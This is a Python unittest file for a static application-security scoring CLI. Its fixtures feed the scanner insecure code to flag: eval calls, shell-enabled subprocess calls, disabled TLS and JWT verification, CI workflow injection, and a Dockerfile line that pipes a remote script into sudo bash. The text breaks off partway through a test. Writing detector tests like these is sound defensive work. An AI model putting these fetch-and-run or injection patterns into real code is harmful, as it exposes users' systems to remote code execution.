"""REQ-01..07: local scans, comparisons, calculations and source boundaries."""

import contextlib
from collections import Counter
import io
import json
import os
from pathlib import Path
import re
import subprocess
import sys
import socket
import tempfile
import threading
import time
import unittest
from unittest import mock


ROOT = Path(__file__).resolve().parent
SCRIPTS = ROOT / "scripts"
sys.path.insert(0, str(SCRIPTS))
import score as cli  # noqa: E402
import score_architecture as architecture  # noqa: E402
import score_core as core  # noqa: E402
import score_sources as sources  # noqa: E402
import score_remote as remote  # noqa: E402
import score_remote_sources as remote_sources  # noqa: E402
import score_relevance as relevance  # noqa: E402
import score_update  # noqa: E402
import score_version  # noqa: E402
import score_reporting as reporting  # noqa: E402
import score_style as style  # noqa: E402


def topic_block(details, title):
    """The heading line and everything beneath it up to the next blank line."""
    match = re.search(rf"(?ms)^{re.escape(title)}\s.*?(?:\n\n|\Z)", details)
    return match.group(0) if match else ""


class ScoreTests(unittest.TestCase):
    def test_deep_python_parser_failure_keeps_other_files_and_reports_location(self):
        self.write("a.py", "eval(payload)\n")
        self.write("deep.py", "x = " + "+".join(["a"] * 1200) + "\neval(payload)\n")
        status, result, errors = self.invoke()
        self.assertEqual(status, 1)
        self.assertEqual(result["observed_score"], 59)
        self.assertIsNone(result["grade"])
        self.assertTrue(any(row["file"] == "a.py" for row in result["findings"]))
        self.assertTrue(
            any(row["file"] == "deep.py" for row in result["source_errors"])
        )
        self.assertNotIn("Traceback", errors)

    def test_malformed_lockfile_version_does_not_discard_other_findings(self):
        self.write("app.py", "eval(payload)\n")
        self.write("package.json", '{"dependencies":{"example":"1.0.0"}}')
        self.write("package-lock.json", '{"lockfileVersion":[],"packages":{}}')
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertEqual(result["observed_score"], 59)
        self.assertTrue(any(row["rule"] == "PY-EXEC" for row in result["findings"]))

    def test_unexpected_boundary_errors_are_sanitized_without_tracebacks(self):
        for failure in (AttributeError, IndexError, OverflowError, RuntimeError):
            with (
                self.subTest(failure=failure),
                mock.patch.object(
                    cli, "run", side_effect=failure("SYNTHETIC_PRIVATE_DIAGNOSTIC")
                ),
            ):
                status, result, errors = self.invoke()
                self.assertEqual(status, 1)
                self.assertIsNone(result)
                self.assertNotIn("SYNTHETIC_PRIVATE_DIAGNOSTIC", errors)
                self.assertNotIn("Traceback", errors)

    def test_unavailable_current_directory_is_reported_without_traceback(self):
        with (
            mock.patch.object(
                cli.os,
                "getcwd",
                side_effect=FileNotFoundError("SYNTHETIC_PRIVATE_DIAGNOSTIC"),
            ),
            contextlib.redirect_stdout(io.StringIO()) as output,
            contextlib.redirect_stderr(io.StringIO()) as errors,
        ):
            status = cli.main(["--json"])
        self.assertEqual(status, 1)
        self.assertEqual(output.getvalue(), "")
        self.assertNotIn("Traceback", errors.getvalue())
        self.assertNotIn("SYNTHETIC_PRIVATE_DIAGNOSTIC", errors.getvalue())

    def test_quiet_cli_has_only_the_number_and_no_progress(self):
        self.write("app.py", "eval(payload)\nsubprocess.run(command, shell=True)\n" * 4)
        self.write("large.js", "x" * (sources.MAX_FILE + 1))
        output, errors = io.StringIO(), io.StringIO()
        with (
            mock.patch.object(cli.threading, "Timer") as timer,
            contextlib.redirect_stdout(output),
            contextlib.redirect_stderr(errors),
        ):
            status = cli.main([str(self.repo), "--quiet"])
        self.assertEqual(status, 1)
        self.assertEqual(output.getvalue(), "0\n")
        self.assertEqual(errors.getvalue(), "")
        timer.assert_not_called()

    def test_quite_alias_and_quiet_details_both_remain_silent(self):
        self.write("app.py", "eval(payload)\n")
        for args in (["--quite"], ["--quiet", "--details"], ["--quite", "--detail"]):
            output, errors = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
                status = cli.main([str(self.repo), *args])
            self.assertEqual(status, 0)
            self.assertEqual(output.getvalue(), "59\n")
            self.assertEqual(errors.getvalue(), "")

    def test_quiet_failure_has_no_output_and_keeps_failure_status(self):
        for path in (str(self.repo), str(self.repo / "missing")):
            output, errors = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
                status = cli.main([path, "--quite"])
            self.assertNotEqual(status, 0)
            self.assertEqual(output.getvalue(), "")
            self.assertEqual(errors.getvalue(), "")

    def test_quiet_rejects_conflicting_output_without_console_text(self):
        output, errors = io.StringIO(), io.StringIO()
        with (
            contextlib.redirect_stdout(output),
            contextlib.redirect_stderr(errors),
            self.assertRaises(SystemExit) as exited,
        ):
            cli.main([str(self.repo), "--quiet", "--json"])
        self.assertEqual(exited.exception.code, 2)
        self.assertEqual(output.getvalue(), "")
        self.assertEqual(errors.getvalue(), "")

    def test_progress_spinner_animates_on_a_terminal(self):
        class Terminal(io.StringIO):
            def isatty(self):
                return True

        output = Terminal()
        with (
            contextlib.redirect_stderr(output),
            mock.patch.dict(os.environ, {"TERM": "xterm"}),
        ):
            progress = cli.Progress()
            progress.stop = mock.Mock()
            progress.stop.is_set.side_effect = [False, False, True]
            progress.animate()
        self.assertIn("\r\033[K| Security checks", output.getvalue())
        self.assertIn("\r\033[K/ Security checks", output.getvalue())

    def test_terminal_progress_keeps_one_status_line_and_clears_it(self):
        class Terminal(io.StringIO):
            def isatty(self):
                return True

        output = Terminal()
        with (
            contextlib.redirect_stderr(output),
            mock.patch.dict(os.environ, {"TERM": "xterm"}),
        ):
            with cli.Progress() as progress:
                progress.step("Reading selected sources...")
                progress.step("Checking source patterns...")
        text = output.getvalue()
        self.assertNotIn("\n", text)
        self.assertIn("Checking source patterns...", text)
        self.assertTrue(text.endswith("\r\033[K"))

    def test_partial_evidence_has_an_index_without_a_repository_grade(self):
        self.write("app.py", "eval(payload)\nsubprocess.run(command, shell=setting)\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertEqual(result["verdict"], "partial")
        self.assertEqual(result["observed_score"], 59)
        self.assertIsNone(result["score"])
        self.assertIsNone(result["grade"])
        self.assertEqual(cli.render(result), "59/100 (partial)")

    def test_uncertain_operation_is_not_hidden_by_violation_of_same_rule(self):
        self.write(
            "app.js",
            "import {exec} from 'child_process'; exec(input); custom.exec(input);",
        )
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertEqual(result["verdict"], "partial")
        self.assertEqual(result["observed_score"], 59)
        self.assertIsNone(result["grade"])

    def test_origin_hints_do_not_silently_remove_runtime_findings(self):
        for path in (
            "app.py",
            "tests/test_app.py",
            "data/static/codefixes/demo.py",
            "assets/bundle.py",
        ):
            self.write(path, "eval(payload)\n")
        _, result, _ = self.invoke()
        self.assertEqual(result["score"], 25)
        self.assertEqual(len(result["findings"]), 4)
        self.assertEqual(
            {row["origin"] for row in result["findings"]},
            {"source", "tests", "examples", "assets"},
        )
        self.assertTrue(
            all(row["certainty"] == "static-pattern" for row in result["findings"])
        )
        self.assertTrue(
            all(group["observed_score"] == 59 for group in result["origin_groups"])
        )

    def test_parse_diagnostics_are_grouped_once_per_file(self):
        self.write("bad.py", "def broken(\n")
        self.write("app.py", "eval(payload)\n")
        _, result, _ = self.invoke()
        self.assertEqual(len(result["source_errors"]), 1)
        self.assertGreater(len(result["source_errors"][0]["affected_rules"]), 1)
        output = cli.render(result, details=True)
        self.assertEqual(output.count("1 file could not be parsed: bad.py"), 1)
        self.assertNotIn("Unclear application check:", output)
        self.assertEqual(result["observed_score"], 59)
        self.assertIsNone(result["grade"])

    def test_repeated_candidates_are_compact_but_json_keeps_locations(self):
        self.write("app.py", "eval(payload)\n" * 12)
        _, result, _ = self.invoke()
        self.assertEqual(len(result["findings"]), 12)
        self.assertEqual(
            cli.render(result, details=True).count(
                "Static pattern candidates; exploitability unverified."
            ),
            1,
        )

    def test_js_shell_requires_child_process_identity(self):
        cases = [
            ("const re = /x/; re.exec(input);", 0, True),
            ("custom.exec(input); object.execSync(input);", 0, True),
            ("wrapper.cp.exec(input);", 0, True),
            (
                "import * as cp from 'child_process'; const alias = cp; alias.exec(input);",
                0,
                True,
            ),
            ("exec(input);", 0, True),
            ("child_process.exec(input);", 0, True),
            ("import {exec as run} from 'node:child_process'; run(input);", 1, False),
            ("const {exec: run} = require('child_process'); run(input);", 1, False),
            (
                "import * as cp from 'child_process'; cp.exec(input); cp.execSync(input);",
                2,
                False,
            ),
            ("// import {exec} from 'child_process';\nexec(input);", 0, True),
            (
                "const doc = `import {exec} from 'child_process';`; exec(input);",
                0,
                True,
            ),
        ]
        for source, count, unclear in cases:
            with self.subTest(source=source):
                findings, checks = core.scan(
                    {"app.js": {"text": source}}, sources.Budget()
                )
                shell_findings = [row for row in findings if row["rule"] == "JS-SHELL"]
                self.assertEqual(len(shell_findings), count)
                shell = next(row for row in checks if row["rule"] == "JS-SHELL")
                self.assertEqual(shell["status"] == "unclear", unclear)

    def test_version_reports_release_and_commit_without_scanning(self):
        output = io.StringIO()
        with (
            mock.patch.object(
                score_version,
                "identity",
                return_value={"version": "0.1.1", "commit": "a" * 40, "dirty": False},
            ),
            mock.patch.object(
                cli, "run", side_effect=AssertionError("version scanned sources")
            ),
            contextlib.redirect_stdout(output),
            self.assertRaises(SystemExit) as exited,
        ):
            cli.main(["--version"])
        self.assertEqual(exited.exception.code, 0)
        self.assertRegex(
            output.getvalue(), r"^security-score 0\.1\.1 \(commit [0-9a-f]{40}"
        )

    def test_source_version_reports_commit_and_modified_checkout(self):
        commit = self.init()
        self.assertEqual(score_version.source_identity(self.repo)["commit"], commit)
        self.assertFalse(score_version.source_identity(self.repo)["dirty"])
        self.write("app.py", "changed = True\n")
        self.assertTrue(score_version.source_identity(self.repo)["dirty"])

    def test_version_without_git_is_explicitly_unknown(self):
        self.write("pyproject.toml", '[project]\nversion = "0.1.1"\n')
        with mock.patch.object(
            score_version.subprocess, "run", side_effect=FileNotFoundError
        ):
            build = score_version.source_identity(self.repo)
        self.assertEqual(
            build, {"version": "0.1.1", "commit": "unknown", "dirty": False}
        )

    def update(self, which, status=0):
        with (
            mock.patch.object(score_update.shutil, "which", side_effect=which),
            mock.patch.object(score_update, "version_text", return_value="old"),
            mock.patch.object(
                score_update.subprocess,
                "run",
                return_value=mock.Mock(returncode=status),
            ) as run,
            mock.patch.object(
                cli, "run", side_effect=AssertionError("update scanned sources")
            ),
            contextlib.redirect_stdout(io.StringIO()),
            contextlib.redirect_stderr(io.StringIO()) as errors,
            self.assertRaises(SystemExit) as exited,
        ):
            cli.main(["--update", "ignored-repository"])
        return exited.exception.code, run, errors.getvalue()

    def test_update_reinstalls_through_pipx_with_fixed_arguments(self):
        code, run, _ = self.update(lambda name: f"/bin/{name}")
        self.assertEqual(code, 0)
        self.assertEqual(
            [call.args[0] for call in run.call_args_list],
            [
                [
                    "/bin/pipx",
                    "upgrade",
                    "--pip-args=--upgrade --force-reinstall --no-cache-dir",
                    "appsec-security-score",
                ],
                ["/bin/security-score", "--version"],
            ],
        )
        for call in run.call_args_list:
            self.assertFalse(call.kwargs.get("shell"))

    def test_update_without_pipx_fails_without_running_anything(self):
        code, run, errors = self.update(lambda name: None)
        self.assertEqual(code, 1)
        run.assert_not_called()
        self.assertIn("pipx upgrade appsec-security-score", errors)

    def test_failed_update_keeps_exit_status_and_skips_version_check(self):
        code, run, errors = self.update(lambda name: f"/bin/{name}", status=3)
        self.assertEqual(code, 3)
        self.assertEqual(run.call_count, 1)
        self.assertIn("Update failed", errors)

    def test_unknown_application_checks_withhold_score_despite_safe_evidence(self):
        self.write(
            "app.py",
            "requests.get(url, verify=True)\nsubprocess.run(command, shell=setting)\neval(payload)\n",
        )
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertEqual(result["verdict"], "partial")
        self.assertIsNone(result["score"])
        self.assertTrue(result["findings"])

    def test_unsupported_application_code_prevents_a_repository_score(self):
        self.write("app.py", "requests.get(url, verify=True)\n")
        self.write("Main.java", "class Main {}")
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertIsNone(result["score"])
        self.assertTrue(
            any(row["rule"] == "SOURCE-COVERAGE" for row in result["checks"])
        )

    def test_unknown_host_settings_do_not_erase_application_score(self):
        result = core.calculate(
            [],
            [
                {"area": "transport", "status": "satisfied"},
                {"area": "repository-host", "status": "unclear"},
            ],
            require_source=True,
        )
        self.assertEqual(result["score"], 100)

    def test_javascript_execution_count_is_formatting_independent(self):
        for source in (
            "eval(a); eval(b);",
            "eval(a);\neval(b);",
            "eval\n(a);\neval\n(b);",
        ):
            with self.subTest(source=source):
                self.write("app.js", source)
                _, result, _ = self.invoke()
                self.assertEqual(result["score"], 50)
                self.assertEqual(len(result["findings"]), 2)

    def test_template_expressions_are_code_and_literal_text_is_not(self):
        for source, expected in (
            ("const x = `${eval(payload)}`;", 1),
            ("const x = `${({x: eval(payload)}).x}`;", 1),
            ("const x = `${`${eval(payload)}`}`;", 1),
            ("const x = `eval(payload)`;", 0),
            ("const x = `\\${eval(payload)}`;", 0),
            ('const x = `${"eval(payload)"}`;', 0),
            ("const x = `${/* eval(payload) */ 1}`;", 0),
        ):
            with self.subTest(source=source):
                findings, _ = core.scan({"app.js": {"text": source}}, sources.Budget())
                self.assertEqual(len(findings), expected)

    def test_ambiguous_template_regex_and_incomplete_templates_fail_closed(self):
        for source in (
            "const x = `${ (/}) ? eval(x) : 1 }`;",
            "const x = `${eval(x)",
        ):
            self.write("app.js", "JSON.parse(data);\n" + source)
            status, result, _ = self.invoke()
            self.assertEqual(status, 1)
            self.assertIsNone(result["score"])

    def test_regex_literals_are_masked_without_hiding_code(self):
        for source, rule, count in (
            ("text.replace(/'/g, '');\neval(input);", "JS-EVAL", 1),
            ("const pattern = /[/'\"]/g;\neval(input);", "JS-EVAL", 1),
            ("const pattern = /eval(input)/;", "JS-EVAL", 0),
            ('function quoted(v) { return /"/.test(v) }\neval(input);', "JS-EVAL", 1),
            ("const test = v => /'/.test(v);\neval(input);", "JS-EVAL", 1),
            ("const half = total / 2; const q = 'a';\neval(input);", "JS-EVAL", 1),
            ("count++ / 2; eval(input) / 3;", "JS-EVAL", 1),
            ("let of = 4; of / 2; eval(input) / 3;", "JS-EVAL", 1),
            ("const s = `${Math.floor(code / 100)}XX`;\neval(input);", "JS-EVAL", 1),
            ("const s = `${/}/.test(x) ? eval(x) : 1}`;", "JS-EVAL", 1),
            (
                "return <p></p><div dangerouslySetInnerHTML={{__html: v}} />;",
                "FRONTEND-BINDING",
                1,
            ),
        ):
            with self.subTest(source=source):
                findings, checks = core.scan(
                    {"app.jsx": {"text": source}}, sources.Budget()
                )
                self.assertFalse(any(row.get("error") for row in checks))
                self.assertEqual(sum(row["rule"] == rule for row in findings), count)

    def test_lexer_and_new_detectors_stay_linear_on_adversarial_input(self):
        size = 128 * 1024
        for path, source in (
            ("app.js", "x = " + "/[" * (size // 2)),
            ("app.js", "a" * size + " / b"),
            ("app.js", "algorithms: [" * (size // 13)),
            (".github/workflows/a.yml", "run: " + "${{" * (size // 3)),
            ("requirements.txt", "a==1 \\\n" * (size // 7)),
            ("Dockerfile", "RUN curl \\\n" * (size // 11)),
        ):
            with self.subTest(path=path, start=source[:12]):
                started = time.monotonic()
                core.scan({path: {"text": source}}, sources.Budget(60))
                self.assertLess(time.monotonic() - started, 10)

    def test_corrected_detectors_avoid_known_false_results(self):
        digest = "a" * 64
        for path, source, rule, status in (
            (
                "app.js",
                "await page.$$eval('li', items => items.length);",
                "JS-EVAL",
                "not_applicable",
            ),
            ("app.js", "obj.eval(payload);", "JS-EVAL", "violated"),
            (
                "app.jsx",
                "items.map(i => <li key={Math.random()}>{i}</li>);",
                "JS-RANDOM",
                "not_applicable",
            ),
            (
                "app.js",
                "const apiKey = Math.random().toString(36);",
                "JS-RANDOM",
                "violated",
            ),
            ("app.js", "if (el.innerHTML == expected) {}", "JS-HTML", "not_applicable"),
            ("app.js", "document.writeln(markup);", "JS-HTML", "violated"),
            (
                "app.js",
                "process.env.NODE_TLS_REJECT_UNAUTHORIZED = setting;",
                "JS-TLS",
                "unclear",
            ),
            (
                "Dockerfile",
                f"FROM node@sha256:{digest} AS base\nFROM base\nFROM python:3",
                "IAC-IMAGE",
                "violated",
            ),
            ("app.Dockerfile", "FROM node:latest", "IAC-IMAGE", "violated"),
            (
                "requirements.txt",
                "--trusted-host packages.example.invalid",
                "PY-DEPENDENCIES",
                "violated",
            ),
            (
                "requirements.txt",
                f"-e git+https://example.invalid/x.git@{'b' * 40}#egg=x",
                "PY-DEPENDENCIES",
                "unclear",
            ),
            (
                "requirements.txt",
                "-i https://packages.example.invalid/simple",
                "PY-DEPENDENCIES",
                "unclear",
            ),
            (
                "requirements.txt",
                "example==1.0 # --hash=sha256:" + digest,
                "PY-DEPENDENCIES",
                "unclear",
            ),
            (
                "headers.py",
                "response.headers['Content-Security-Policy'] = \"script-src 'nonce-x' 'unsafe-eval'\"",
                "WEB-CSP",
                "violated",
            ),
            (
                "headers.py",
                "response.headers['Content-Security-Policy'] = \"script-src 'strict-dynamic' 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\"",
                "WEB-CSP",
                "satisfied",
            ),
            ("app.py", "subprocess.getoutput(command)", "PY-SHELL", "violated"),
            ("app.py", "yaml.safe_load_all(stream)", "PY-YAML", "satisfied"),
            ("app.py", "context.check_hostname = setting", "PY-TLS", "unclear"),
            ("app.py", "httpx.AsyncClient()", "PY-TLS", "satisfied"),
        ):
            with self.subTest(path=path, source=source):
                _, checks = core.scan({path: {"text": source + "\n"}}, sources.Budget())
                self.assertEqual(
                    next(row for row in checks if row["rule"] == rule)["status"], status
                )

    def test_workflow_rules_need_untrusted_text_in_executed_scripts(self):
        workflow = ".github/workflows/check.yml"
        for source, rule, lines in (
            (
                'steps:\n  - run: |\n      echo ok\n      echo "${{ github.event.pull_request.title }}"\n  - run: echo done\n',
                "CI-SCRIPT-INJECTION",
                [4],
            ),
            (
                "steps:\n  - uses: actions/github-script@"
                + "a" * 40
                + "\n    with:\n      script: |\n        core.info('${{ github.event.comment.body }}')\n",
                "CI-SCRIPT-INJECTION",
                [5],
            ),
            (
                "steps:\n  - if: contains(github.event.issue.title, 'x')\n    run: echo hi\n",
                "CI-SCRIPT-INJECTION",
                [],
            ),
            (
                "steps:\n  - run: echo ${{ github.event.release.tag_name }} ${{ github.sha }}\n",
                "CI-SCRIPT-INJECTION",
                [],
            ),
            (
                "steps:\n  # - run: echo ${{ github.event.issue.title }}\n  - run: echo hi\n",
                "CI-SCRIPT-INJECTION",
                [],
            ),
            (
                "steps:\n  - run: echo github.event.issue.title\n",
                "CI-SCRIPT-INJECTION",
                [],
            ),
            (
                "on:\n  workflow_run:\n    workflows: [ci]\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n",
                "CI-PR-HEAD-CHECKOUT",
                [9],
            ),
            (
                "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: gh pr checkout ${{ github.event.number }}\n",
                "CI-PR-HEAD-CHECKOUT",
                [5],
            ),
            (
                "on: [pull_request_target]\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n",
                "CI-PR-HEAD-CHECKOUT",
                [],
            ),
            (
                "on: push\njobs:\n  a:\n    if: github.event_name == 'pull_request_target'\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n",
                "CI-PR-HEAD-CHECKOUT",
                [],
            ),
        ):
            with self.subTest(source=source):
                findings, _ = core.scan({workflow: {"text": source}}, sources.Budget())
                self.assertEqual(
                    [row["line"] for row in findings if row["rule"] == rule], lines
                )

    def test_container_privileges_need_explicit_settings(self):
        for path, source, status in (
            (
                "deploy/pod.yaml",
                "securityContext:\n  privileged: true  # needed\n",
                "violated",
            ),
            ("pod.yaml", "spec:\n  hostPID: yes\n", "violated"),
            (
                "pod.yaml",
                "volumes:\n  - hostPath:\n      path: /var/run/docker.sock\n",
                "violated",
            ),
            (
                "compose.yaml",
                'services:\n  app:\n    network_mode: "host"\n',
                "violated",
            ),
            ("values.yaml", "privileged:\n  enabled: true\n", "not_applicable"),
            ("values.yaml", "# privileged: true\n", "not_applicable"),
            (
                "values.yaml",
                "securityContext:\n  privileged: ${PRIVILEGED}\n",
                "unclear",
            ),
            (
                "Dockerfile",
                "RUN set -eux; \\\n  # installer\n  curl -sSL https://example.invalid/i.sh \\\n  | sudo -E bash -\n",
                "violated",
            ),
            (
                "Dockerfile",
                "# RUN curl https://example.invalid/i.sh | sh\n",
                "not_applicable",
            ),
            ("Dockerfile", "ADD http://example.invalid/tool.tgz /opt/\n", "violated"),
            (
                "Dockerfile",
                f"ADD https://example.invalid/x.git#{'a' * 40} /src\n",
                "satisfied",
            ),
        ):
            with self.subTest(path=path, source=source):
                _, checks = core.scan({path: {"text": source}}, sources.Budget())
                rules = {"IAC-PRIVILEGED", "IAC-REMOTE-SCRIPT", "IAC-ADD-URL"}
                outcomes = {row["status"] for row in checks if row["rule"] in rules} - {
                    "not_applicable"
                }
                self.assertEqual(outcomes or {"not_applicable"}, {status})

    def test_token_verification_options_must_be_literal(self):
        for path, source, status in (
            (
                "auth.py",
                "ALGORITHM = 'HS256'\nALGORITHM = choose()\njwt.decode(t, k, algorithms=[ALGORITHM])\n",
                "unclear",
            ),
            (
                "auth.py",
                "jwt.decode(t, k, algorithms=['HS256'], options=settings)\n",
                "unclear",
            ),
            (
                "auth.py",
                "jwt.decode(t, k, algorithms=['HS256'], options={'verify_exp': False})\n",
                "violated",
            ),
            ("auth.py", "jwt.decode(t, k, verify=False)\n", "violated"),
            ("auth.py", "jose.jwt.decode(t, k, algorithms=('RS256',))\n", "satisfied"),
            (
                "auth.js",
                "jwt.verify(t, k, { algorithms: ['HS256'], ignoreExpiration: true });\n",
                "violated",
            ),
            (
                "auth.js",
                "jwt.verify(t, k, { algorithms: ['RS256' /* , 'none' */] });\n",
                "unclear",
            ),
            (
                "auth.js",
                "jwt.verify(t, k, { algorithms: ['NONE', 'RS256'] });\n",
                "violated",
            ),
            (
                "auth.js",
                "const note = \"{ algorithms: ['none'] }\";\n",
                "not_applicable",
            ),
        ):
            with self.subTest(source=source):
                _, checks = core.scan({path: {"text": source}}, sources.Budget())
                self.assertEqual(
                    next(row for row in checks if row["rule"].endswith("-JWT"))[
                        "status"
                    ],
                    status,
                )

    def test_token_verification_assesses_the_authentication_topic(self):
        self.write("auth.py", "claims = jwt.decode(token, key, algorithms=['RS256'])\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 0)
        topics = {topic["id"]: topic for topic in reporting.subcategories(result)}
        self.assertEqual(topics["authentication"]["index"], 100)
        self.write(
            "auth.py",
            "claims = jwt.decode(token, options={'verify_signature': False})\n",
        )
        _, result, _ = self.invoke()
        self.assertEqual(result["score"], 59)
        self.assertEqual(
            {row["area"] for row in result["findings"]}, {"authentication"}
        )

    def test_severity_policy_rejects_inverted_weights_and_caps(self):
        import score_calculation as calculation

        for field, values in (
            ("WEIGHTS", {"critical": 1}),
            ("CAPS", {"critical": 100}),
        ):
            with (
                self.subTest(field=field),
                mock.patch.dict(getattr(calculation, field), values),
            ):
                with self.assertRaisesRegex(ValueError, "Higher severity"):
                    calculation.validate_scoring()

    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory(prefix="security-score-test-")
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.repo = self.root / "source"
        self.repo.mkdir()

    def write(self, path, text):
        destination = self.repo / path
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_text(text)
        return destination

    def invoke(self, *args):
        output, errors = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
            status = cli.main([str(self.repo), "--json", *args])
        return (
            status,
            json.loads(output.getvalue()) if output.getvalue() else None,
            errors.getvalue(),
        )

    def git(self, *args):
        result = subprocess.run(
            [
                "git",
                "-C",
                str(self.repo),
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "user.name=Score test",
                "-c",
                "user.email=fixture@example.invalid",
                *args,
            ],
            capture_output=True,
            text=True,
            timeout=5,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        return result.stdout.strip()

    def init(self, source="requests.get(url, verify=True)\n"):
        self.git("init", "-b", "main")
        self.write("app.py", source)
        self.git("add", ".")
        self.git("commit", "--no-gpg-sign", "-m", "Baseline")
        return self.git("rev-parse", "HEAD")

    def test_catalog_has_verifiable_positive_and_negative_examples(self):
        result = cli.verify_rules()
        self.assertGreaterEqual(result["rules_verified"], 16)
        self.assertGreaterEqual(result["examples_verified"], 32)
        self.assertEqual(len({rule["id"] for rule in core.RULES}), len(core.RULES))

    def test_default_is_independent_read_only_and_reproducible(self):
        path = self.write("app.py", "requests.get(url, verify=True)\n")
        before = path.read_bytes()
        with mock.patch.object(
            cli.shutil,
            "which",
            side_effect=AssertionError("default consulted Analyzer"),
        ):
            first = self.invoke()
            second = self.invoke()
        self.assertEqual(first[0], 0)
        self.assertEqual(first[1], second[1])
        self.assertEqual(first[1]["engine"], "internal")
        self.assertEqual((first[1]["score"], first[1]["grade"]), (100, "A"))
        self.assertEqual(path.read_bytes(), before)
        self.assertEqual(list(self.repo.iterdir()), [path])

    def test_grade_boundaries(self):
        for score, expected in (
            (0, "F"),
            (49, "F"),
            (50, "E"),
            (59, "E"),
            (60, "D"),
            (69, "D"),
            (70, "C"),
            (79, "C"),
            (80, "B"),
            (89, "B"),
            (90, "A"),
            (100, "A"),
            (None, None),
        ):
            with self.subTest(score=score):
                self.assertEqual(core.grade(score), expected)

    def test_findings_without_control_baseline_reduce_score(self):
        self.write("app.py", "eval(payload)\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 0)
        self.assertEqual(result["score"], 59)
        self.assertEqual(result["findings"][0]["rule"], "PY-EXEC")
        self.assertEqual(result["grade"], "E")

    def test_severe_findings_are_not_offset_by_unrelated_controls(self):
        self.write(
            "app.py", "eval(payload)\n" + "requests.get(url, verify=True)\n" * 100
        )
        self.assertEqual(self.invoke()[1]["score"], 59)

    def test_req07_linear_repetition_counts_findings_across_files(self):
        self.write("first.py", "eval(payload)\n")
        for count, expected in ((1, 59), (2, 50), (3, 25), (4, 25), (9, 25)):
            with self.subTest(count=count):
                self.write("remaining.py", "eval(payload)\n" * (count - 1))
                status, result, _ = self.invoke()
                self.assertEqual(status, 0)
                self.assertEqual(result["scoring_version"], 6)
                self.assertEqual(result["score"], expected)
                self.assertEqual(len(result["findings"]), count)
                area = next(
                    row for row in result["areas"] if row["area"] == "execution"
                )
                counted = min(count, 3)
                self.assertEqual(area["deduction"], counted * 25)
                self.assertEqual(
                    area["breakdown"],
                    [
                        {
                            "rule": "PY-EXEC",
                            "severity": "high",
                            "instances": count,
                            "counted_instances": counted,
                            "points_per_instance": 25,
                            "deduction": counted * 25,
                            "severity_cap": 59,
                        }
                    ],
                )

    def test_counted_instances_are_per_rule_and_validated(self):
        import score_calculation as calculation

        self.write("app.py", "eval(payload)\nsubprocess.run(command, shell=True)\n" * 5)
        result = self.invoke()[1]
        self.assertEqual(result["score"], 0)  # Two rules deduct 75 points each.
        for value in (0, "3", True):
            with self.subTest(value=value):
                with mock.patch.object(calculation, "COUNTED_INSTANCES", value):
                    with self.assertRaisesRegex(ValueError, "Counted instances"):
                        calculation.validate_scoring()

    def test_req07_different_rules_add_within_area_but_not_between_areas(self):
        self.write("app.py", "eval(payload)\nsubprocess.run(command, shell=True)\n")
        self.write("transport.py", "requests.get(url, verify=False)\n")
        self.write("safe.js", "element.textContent = payload;\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 0)
        self.assertEqual(result["score"], 50)
        areas = {row["area"]: row for row in result["areas"]}
        self.assertEqual(areas["execution"]["score"], 50)
        self.assertEqual(areas["transport"]["score"], 59)
        self.assertEqual(areas["output"]["score"], 100)
        self.assertEqual(
            [row["rule"] for row in areas["execution"]["breakdown"]],
            ["PY-EXEC", "PY-SHELL"],
        )
        details = cli.render(result, details=True)
        self.assertRegex(details, r"(?m)^Architecture\s+50/100")
        self.assertRegex(details, r"(?m)^Deployment & transport\s+59/100")
        self.assertIn("PY-EXEC", details)
        self.assertNotIn("Deduction", details)
        self.assertEqual(cli.render(result), "50/100 (E)")

    def test_req07_mixed_severities_and_critical_cap_worked_examples(self):
        # REQ-03/07: independently specified arithmetic, including catalog severities
        # for which the current detectors may not emit findings.
        for severities, expected_deduction, expected_cap, expected_score in (
            (["critical"], 50, 39, 39),
            (["critical", "critical"], 100, 39, 0),
            (["high", "medium", "medium", "medium"], 55, 59, 45),
            (["medium", "medium", "medium"], 30, 79, 70),
            (["low"], 3, 89, 89),
            (["low", "low", "low", "low"], 9, 89, 89),
        ):
            with self.subTest(severities=severities):
                result = core.calculate(
                    [
                        {
                            "rule": f"EXAMPLE-{severity.upper()}",
                            "severity": severity,
                            "area": "example",
                        }
                        for severity in severities
                    ],
                    [{"area": "example", "status": "violated"}],
                )
                self.assertEqual(result["score"], expected_score)
                self.assertEqual(result["areas"][0]["deduction"], expected_deduction)
                self.assertEqual(result["areas"][0]["severity_cap"], expected_cap)

    def test_req07_human_edited_weights_and_caps_change_direct_script_result(self):
        import shutil

        installed = self.root / "installed-skill"
        shutil.copytree(ROOT, installed)
        catalog = installed / "rules.json"
        policy = json.loads(catalog.read_text())
        self.write("app.py", "eval(payload)\n" * 3)

        def run_installed():
            result = subprocess.run(
                [
                    sys.executable,
                    "-B",
                    str(installed / "scripts/score.py"),
                    str(self.repo),
                    "--json",
                ],
                capture_output=True,
                text=True,
                timeout=5,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            return json.loads(result.stdout)

        original = run_installed()
        policy["scoring"]["weights"]["high"] = 15
        policy["scoring_version"] = 7
        catalog.write_text(json.dumps(policy))
        adjusted = run_installed()
